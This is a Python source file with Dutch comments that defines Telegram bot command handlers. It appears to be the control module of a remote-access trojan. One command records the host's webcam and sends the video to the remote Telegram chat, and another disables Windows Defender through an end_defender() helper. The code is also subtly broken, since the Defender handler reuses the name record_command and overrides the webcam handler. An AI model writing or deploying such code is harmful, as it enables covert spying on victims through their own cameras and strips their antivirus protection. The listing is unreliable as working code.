# Deze file bevat alle commands die via telegram chat uitgevoerd kunnen worden
from telegram import Update
from telegram.ext import ContextTypes
from functions import *

# ASCII banner
# update info over binnenkomende bericht
# context extra informatie die je kan gebruiken
async def banner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(get_banner())

# lijst van alle commands terug geven
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(get_command_list())

# Reactie om alles dat geen slash command is
async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Ik reageer alleen op slash commands. Gebruik /help voor een overzicht van alle commands."
    )

# webcam recording maken
async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # meld dat recording begonnen is
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Webcam opname is begonnen...")

    # start recording
    # Source: https://stackoverflow.com/questions/47615956/send-video-through-telegram-python-api
    await context.bot.send_video(
        chat_id=update.effective_chat.id,
        video=open(get_camRecording(), 'rb'),
        supports_streaming=True
    )

# Windows defender uitzetten
async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # meld dat Windows defender uit is
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Windows Defender is uitgeschakeld")
    end_defender()


# Log errors
async def log_error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {context.error}')